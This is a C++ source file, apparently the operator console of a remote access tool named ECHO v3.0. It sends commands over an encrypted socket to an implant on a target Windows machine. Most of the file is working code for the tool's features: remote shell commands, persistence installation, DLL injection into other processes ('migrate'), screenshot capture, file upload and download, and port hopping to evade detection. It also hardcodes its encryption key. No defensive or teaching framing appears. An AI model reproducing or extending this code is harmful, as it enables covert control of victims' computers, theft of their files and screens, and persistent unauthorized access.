#define _WIN32_WINNT 0x0601
#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <thread>
#include <chrono>
#include "lib/crypto.h"

#define FILE_BUFFER 8192
#define SOCKET_TIMEOUT_MS 120000

#pragma comment(lib, "ws2_32.lib")

#define RST   "\033[0m"
#define BOLD  "\033[1m"
#define DIM   "\033[2m"

#define FG_RED     "\033[38;5;196m"
#define FG_ORANGE  "\033[38;5;208m"
#define FG_YELLOW  "\033[38;5;226m"
#define FG_GREEN   "\033[38;5;82m"
#define FG_CYAN    "\033[38;5;51m"
#define FG_BLUE    "\033[38;5;75m"
#define FG_PURPLE  "\033[38;5;135m"
#define FG_GRAY    "\033[38;5;245m"
#define FG_WHITE   "\033[38;5;255m"
#define FG_PINK    "\033[38;5;213m"

static void enable_ansi() {
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD mode = 0; GetConsoleMode(h, &mode);
    SetConsoleMode(h, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
    SetConsoleOutputCP(CP_UTF8);
}

static int term_width() {
    CONSOLE_SCREEN_BUFFER_INFO c;
    GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &c);
    return c.srWindow.Right - c.srWindow.Left + 1;
}

static void print_line(char c = '-') {
    int w = term_width();
    printf(FG_PURPLE);
    for (int i = 0; i < w; i++) putchar(c);
    printf(RST "\n");
}

static void print_banner() {
    printf("\033[2J\033[H");
    print_line('=');
    printf(BOLD FG_CYAN
        "   ███████╗ ██████╗██╗  ██╗ ██████╗     ██╗   ██╗██████╗ \n"
        "   ██╔════╝██╔════╝██║  ██║██╔═══██╗    ██║   ██║╚════██╗\n"
        "   █████╗  ██║     ███████║██║   ██║    ██║   ██║ █████╔╝\n"
        "   ██╔══╝  ██║     ██╔══██║██║   ██║    ╚██╗ ██╔╝ ╚═══██╗\n"
        "   ███████╗╚██████╗██║  ██║╚██████╔╝     ╚████╔╝ ██████╔╝\n"
        "   ╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝       ╚═══╝  ╚═════╝ \n" RST);
    printf(FG_GRAY "                  Github: github.com/esfelorm/ECHO\n" RST);
    print_line('=');
    printf(FG_PURPLE "  [" RST FG_GREEN "+" RST FG_PURPLE "]" RST
           FG_WHITE  " ChaCha20 Encrypted  " RST
           FG_PURPLE "[" RST FG_GREEN "+" RST FG_PURPLE "]" RST
           FG_WHITE  " Port Hopping  " RST
           FG_PURPLE "[" RST FG_GREEN "+" RST FG_PURPLE "]" RST
           FG_WHITE  " DLL Migration\n" RST);
    print_line();
    printf("\n");
}

SOCKET   sock = INVALID_SOCKET;
int      current_port = 0;
std::string server_ip;
Crypto*  g_crypto = nullptr;

const unsigned char SECRET_KEY[] = "MyUltraSecureKey2024!@#$%Remote";
const int KEY_LEN = sizeof(SECRET_KEY) - 1;

bool send_all(const char* data, int len, int timeout_ms = SOCKET_TIMEOUT_MS) {
    if (len <= 0 || sock == INVALID_SOCKET) return true;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
    int sent = 0;
    while (sent < len) {
        int n = send(sock, data + sent, len - sent, 0);
        if (n == SOCKET_ERROR) {
            int e = WSAGetLastError();
            if (e == WSAEWOULDBLOCK || e == WSAETIMEDOUT) continue;
            return false;
        }
        if (n == 0) return false;
        sent += n;
    }
    return true;
}

int recv_all(char* buf, int len, int timeout_ms = SOCKET_TIMEOUT_MS) {
    if (len <= 0 || sock == INVALID_SOCKET) return 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
    int got = 0;
    while (got < len) {
        int n = recv(sock, buf + got, len - got, 0);
        if (n == SOCKET_ERROR) {
            int e = WSAGetLastError();
            if (e == WSAEWOULDBLOCK || e == WSAETIMEDOUT) continue;
            return -1;
        }
        if (n == 0) return -1;
        got += n;
    }
    return got;
}

void send_encrypted(const char* data, int len) {
    if (len == 0 || sock == INVALID_SOCKET) return;
    unsigned char* enc = new unsigned char[len];
    memcpy(enc, data, len);
    g_crypto->encrypt(enc, len);
    send_all((char*)&len, sizeof(int));
    int off = 0, chunk = 8192;
    while (off < len) {
        int cur = (len - off) < chunk ? (len - off) : chunk;
        send_all((char*)enc + off, cur);
        off += cur;
        Sleep(1);
    }
    delete[] enc;
}

int recv_encrypted(char* out, int max_size = 100 * 1024 * 1024) {
    if (sock == INVALID_SOCKET) return -1;
    int len = 0;
    if (recv_all((char*)&len, sizeof(int)) != sizeof(int)) return -1;
    if (len <= 0 || len > max_size) return -1;
    unsigned char* enc = new unsigned char[len];
    int got = 0, chunk = 8192;
    while (got < len) {
        int cur = (len - got) < chunk ? (len - got) : chunk;
        int n = recv_all((char*)enc + got, cur);
        if (n != cur) { delete[] enc; return -1; }
        got += n;
    }
    g_crypto->decrypt(enc, len);
    memcpy(out, enc, len);
    delete[] enc;
    return len;
}

void receive_and_display() {
    char* buf = new char[100 * 1024 * 1024 + 1];
    memset(buf, 0, 100 * 1024 * 1024 + 1);
    int n = recv_encrypted(buf, 100 * 1024 * 1024);
    if (n > 0) {
        buf[n] = '\0';
        printf(FG_WHITE "%s" RST, buf);
    } else if (n == -1) {
        printf(FG_RED "\n  [!] Connection lost\n" RST);
        delete[] buf;
        exit(1);
    }
    delete[] buf;
}

void execute_remote(const std::string& cmd) {
    send_encrypted(cmd.c_str(), (int)cmd.size());
    receive_and_display();
}

void print_help() {
    print_line();
    printf(BOLD FG_CYAN "  ECHO v3.0 - Command Reference\n" RST);
    print_line();
    const char* cmds[][2] = {
        {"help",              "Show this table"},
        {"clear / cls",       "Clear screen"},
        {"pwd",               "Print working directory"},
        {"cd <path>",         "Change directory"},
        {"ls / dir",          "List directory (use shell dir)"},
        {"ps / tasklist",     "List running processes"},
        {"me / whoami",       "Current process info"},
        {"sysinfo",           "OS, CPU, RAM, hostname, username"},
        {"persist",           "Install persistence"},
        {"screenshot",        "Capture screen -> save locally"},
        {"migrate <pid|name>","Inject DLL into target process"},
        {"hop <port>",        "Change port + auto-reconnect"},
        {"upload <file>",     "Upload local file to target"},
        {"download <file>",   "Download file from target"},
        {"exit / quit",       "Disconnect and exit"},
    };
    for (auto& c : cmds)
        printf("  " FG_GREEN "%-22s" RST FG_GRAY "%s\n" RST, c[0], c[1]);
    print_line();
}

bool connect_to_server(const std::string& ip, int port) {
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;
    int bufsz = 256 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*)&bufsz, sizeof(bufsz));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*)&bufsz, sizeof(bufsz));
    sockaddr_in srv; srv.sin_family = AF_INET;
    srv.sin_port = htons(port);
    srv.sin_addr.s_addr = inet_addr(ip.c_str());
    if (connect(sock, (sockaddr*)&srv, sizeof(srv)) == SOCKET_ERROR) {
        closesocket(sock); sock = INVALID_SOCKET; return false;
    }
    current_port = port;
    return true;
}

void upload_file(const std::string& filename) {
    std::ifstream f(filename, std::ios::binary);
    if (!f) { printf(FG_RED "\n  [!] File not found: %s\n" RST, filename.c_str()); return; }
    f.seekg(0, std::ios::end); long fsz = f.tellg(); f.seekg(0);

    std::string cmd = "UPLOAD:" + filename;
    send_encrypted(cmd.c_str(), (int)cmd.size());

    char resp[32] = {0};
    recv_encrypted(resp, 32);
    if (strcmp(resp, "READY") != 0) {
        printf(FG_RED "\n  [!] Upload failed: %s\n" RST, resp);
        return;
    }

    printf(FG_GREEN "\n  [UPLOAD] " FG_CYAN "%s" RST " (%ld bytes)\n", filename.c_str(), fsz);
    char buf[FILE_BUFFER]; long sent = 0;
    while (f.read(buf, FILE_BUFFER) || f.gcount() > 0) {
        send_encrypted(buf, (int)f.gcount()); sent += f.gcount();
        int pct = (int)((sent * 100LL) / fsz);
        int filled = (pct * 40) / 100;
        printf("\r  " FG_PURPLE "[");
        for (int i = 0; i < filled; i++) printf(FG_GREEN "=");
        for (int i = filled; i < 40; i++) printf(" ");
        printf(FG_PURPLE "] " FG_YELLOW "%d%%" RST, pct);
        fflush(stdout);
    }
    send_encrypted("EOF", 3);
    memset(resp, 0, 32); recv_encrypted(resp, 32);
    if (strcmp(resp, "UPLOAD_SUCCESS") == 0)
        printf(FG_GREEN "\n  [+] Upload complete\n" RST);
    else
        printf(FG_RED "\n  [!] Upload failed\n" RST);
    f.close();
}

void download_file(const std::string& filename) {
    std::string cmd = "DOWNLOAD:" + filename;
    send_encrypted(cmd.c_str(), (int)cmd.size());
    char sizeStr[64] = {0};
    recv_encrypted(sizeStr, 64);
    if (strncmp(sizeStr, "ERROR", 5) == 0) {
        printf(FG_RED "\n  [!] %s\n" RST, sizeStr);
        return;
    }
    long fsz = atol(sizeStr);
    send_encrypted("READY", 5);
    std::ofstream f(filename, std::ios::binary);
    if (!f) { printf(FG_RED "\n  [!] Cannot create file\n" RST); return; }
    printf(FG_GREEN "\n  [DOWNLOAD] " FG_CYAN "%s" RST " (%ld bytes)\n", filename.c_str(), fsz);
    char buf[FILE_BUFFER]; long got = 0;
    while (got < fsz) {
        memset(buf, 0, FILE_BUFFER);
        int n = recv_encrypted(buf, FILE_BUFFER);
        if (n <= 0) break;
        if (n == 3 && strncmp(buf, "EOF", 3) == 0) break;
        f.write(buf, n); got += n;
        int pct = (int)((got * 100LL) / fsz);
        int filled = (pct * 40) / 100;
        printf("\r  " FG_PURPLE "[");
        for (int i = 0; i < filled; i++) printf(FG_GREEN "=");
        for (int i = filled; i < 40; i++) printf(" ");
        printf(FG_PURPLE "] " FG_YELLOW "%d%%" RST, pct);
        fflush(stdout);
    }
    f.close();
    printf(FG_GREEN "\n  [+] Download complete\n" RST);
}

void receive_screenshot() {
    char sizeStr[64] = {0};
    recv_encrypted(sizeStr, 64);
    if (strncmp(sizeStr, "ERROR", 5) == 0) {
        printf(FG_RED "\n  [!] %s\n" RST, sizeStr);
        return;
    }
    long fsz = atol(sizeStr);
    send_encrypted("READY", 5);

    char filename[64];
    SYSTEMTIME st; GetLocalTime(&st);
    sprintf_s(filename, "screenshot_%04d%02d%02d_%02d%02d%02d.bmp",
              st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    std::ofstream f(filename, std::ios::binary);
    if (!f) { printf(FG_RED "\n  [!] Cannot create file\n" RST); return; }
    printf(FG_GREEN "\n  [SCREENSHOT] " FG_CYAN "%s" RST " (%ld bytes)\n", filename, fsz);
    char buf[FILE_BUFFER]; long got = 0;
    while (got < fsz) {
        memset(buf, 0, FILE_BUFFER);
        int n = recv_encrypted(buf, FILE_BUFFER);
        if (n <= 0) break;
        if (n == 3 && strncmp(buf, "EOF", 3) == 0) break;
        f.write(buf, n); got += n;
        int pct = (int)((got * 100LL) / fsz);
        int filled = (pct * 40) / 100;
        printf("\r  " FG_PURPLE "[");
        for (int i = 0; i < filled; i++) printf(FG_GREEN "=");
        for (int i = filled; i < 40; i++) printf(" ");
        printf(FG_PURPLE "] " FG_YELLOW "%d%%" RST, pct);
        fflush(stdout);
    }
    f.close();
    printf(FG_GREEN "\n  [+] Saved: %s\n" RST, filename);
}

void hop_port(const std::string& port_str) {
    int new_port = 0;
    try { new_port = std::stoi(port_str); } catch (...) {
        printf(FG_RED "\n  [!] Invalid port\n" RST); return;
    }
    printf(FG_YELLOW "\n  [HOP] Requesting port change to %d...\n" RST, new_port);
    std::string cmd = "hop " + port_str;
    send_encrypted(cmd.c_str(), (int)cmd.size());

    char ready[32] = {0};
    int n = recv_encrypted(ready, 32);
    if (n <= 0 || strcmp(ready, "HOP_READY") != 0) {
        printf(FG_RED "  [!] No HOP_READY from server\n" RST); return;
    }
    send_encrypted("ACK", 3);
    char msg[256] = {0};
    recv_encrypted(msg, 256);
    printf(FG_GREEN "  [HOP] Server: " RST); printf("%s", msg);

    closesocket(sock); sock = INVALID_SOCKET;
    Sleep(1800);

    delete g_crypto;
    g_crypto = new Crypto(SECRET_KEY, KEY_LEN);

    bool ok = false;
    for (int attempt = 1; attempt <= 6; attempt++) {
        printf(FG_YELLOW "\r  [HOP] Attempt %d/6 -> %s:%d   " RST, attempt, server_ip.c_str(), new_port);
        fflush(stdout);
        if (connect_to_server(server_ip, new_port)) { ok = true; break; }
        Sleep(1200);
    }
    printf("\n");
    if (ok) printf(FG_GREEN "  [+] Reconnected on port %d\n" RST, new_port);
    else {
        printf(FG_RED "  [!] Failed to reconnect — session lost\n" RST);
        exit(1);
    }
}

void migrate_target(const std::string& target) {
    printf(FG_YELLOW "\n  [MIGRATE] Injecting into %s...\n" RST, target.c_str());
    std::string cmd = "migrate " + target;
    send_encrypted(cmd.c_str(), (int)cmd.size());
    char resp[512] = {0};
    int n = recv_encrypted(resp, 512);
    if (n <= 0) {
        printf(FG_RED "  [!] No response from server\n" RST);
        return;
    }
    printf(FG_WHITE "%s" RST, resp);

    if (strstr(resp, "[+] Migrated") != nullptr) {
        printf(FG_YELLOW "  [MIGRATE] Server is switching processes. Reconnecting...\n" RST);
        closesocket(sock); sock = INVALID_SOCKET;
        Sleep(4000);
        delete g_crypto;
        g_crypto = new Crypto(SECRET_KEY, KEY_LEN);

        bool ok = false;
        for (int attempt = 1; attempt <= 15; attempt++) {
            printf(FG_YELLOW "\r  [MIGRATE] Reconnect attempt %d/15 -> %s:%d  " RST,
                   attempt, server_ip.c_str(), current_port);
            fflush(stdout);
            if (connect_to_server(server_ip, current_port)) {
                send_encrypted("CRYPTO_SYNC", 11);
                char syncResp[16] = {0};
                int sr = recv_encrypted(syncResp, 16);
                if (sr > 0 && strncmp(syncResp, "SYNC_OK", 7) == 0) {
                    ok = true;
                    break;
                }
                closesocket(sock); sock = INVALID_SOCKET;
            }
            Sleep(1200);
        }
        printf("\n");
        if (ok) {
            printf(FG_GREEN "  [+] Reconnected via migrated process\n" RST);
        } else {
            printf(FG_RED "  [!] Reconnect failed — migrated process may not be listening\n" RST);
        }
    }
}

void repl() {
    std::string input;
    while (true) {
        printf("\n" FG_PURPLE "[" RST FG_RED "ECHO" RST FG_PURPLE "|" RST
               FG_CYAN "%s" RST FG_PURPLE ":" RST FG_YELLOW "%d" RST
               FG_PURPLE "]" RST FG_GREEN " > " RST,
               server_ip.c_str(), current_port);
        fflush(stdout);
        if (!std::getline(std::cin, input)) break;
        if (input.empty()) continue;

        if (input == "exit" || input == "quit") {
            printf(FG_RED "\n  [!] Disconnecting...\n" RST);
            break;
        }
        else if (input == "help")    { print_help(); }
        else if (input == "clear" || input == "cls") { print_banner(); print_help(); }
        else if (input == "pwd")     { execute_remote("pwd"); }
        else if (input == "me")      { execute_remote("me"); }
        else if (input == "ps")      { execute_remote("ps"); }
        else if (input == "sysinfo") { execute_remote("sysinfo"); }
        else if (input == "persist") { execute_remote("persist"); }

        else if (input == "screenshot") {
            send_encrypted("screenshot", 10);
            char sig[32] = {0};
            int n = recv_encrypted(sig, 32);
            if (n > 0 && strcmp(sig, "SCREENSHOT_READY") == 0) {
                receive_screenshot();
            } else {
                printf(FG_RED "  %s\n" RST, sig);
            }
        }

        else if (input.rfind("migrate ", 0) == 0) {
            migrate_target(input.substr(8));
        }
        else if (input == "migrate") {
            printf(FG_YELLOW "  Usage: migrate <PID|process_name>\n" RST);
        }

        else if (input.rfind("upload ", 0) == 0)   { upload_file(input.substr(7)); }
        else if (input.rfind("download ", 0) == 0) { download_file(input.substr(9)); }

        else if (input.rfind("hop ", 0) == 0)      { hop_port(input.substr(4)); }
        else if (input == "hop") {
            printf(FG_YELLOW "  Usage: hop <port>\n" RST);
        }

        else { execute_remote(input); }
    }
}

int main() {
    enable_ansi();
    print_banner();

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf(FG_RED "  [!] WSAStartup failed\n" RST);
        return 1;
    }

    printf(FG_WHITE "  Server IP   " FG_GRAY "[127.0.0.1]" RST ": ");
    std::string ip; std::getline(std::cin, ip);
    if (ip.empty()) ip = "127.0.0.1";
    server_ip = ip;

    printf(FG_WHITE "  Server Port " FG_GRAY "[4545]" RST ": ");
    std::string ps; std::getline(std::cin, ps);
    int port = ps.empty() ? 4545 : atoi(ps.c_str());

    printf("\n");
    g_crypto = new Crypto(SECRET_KEY, KEY_LEN);

    if (connect_to_server(server_ip, port)) {
        printf(FG_GREEN "  [+] Connected to " FG_CYAN "%s:%d\n" RST, server_ip.c_str(), port);
        printf(FG_GRAY  "  [*] ChaCha20 encryption active\n" RST);
        printf(FG_GRAY  "  [*] Type 'help' for commands\n" RST);
        repl();
    } else {
        printf(FG_RED "  [!] Connection failed\n" RST);
    }

    if (sock != INVALID_SOCKET) closesocket(sock);
    WSACleanup();
    delete g_crypto;
    return 0;
}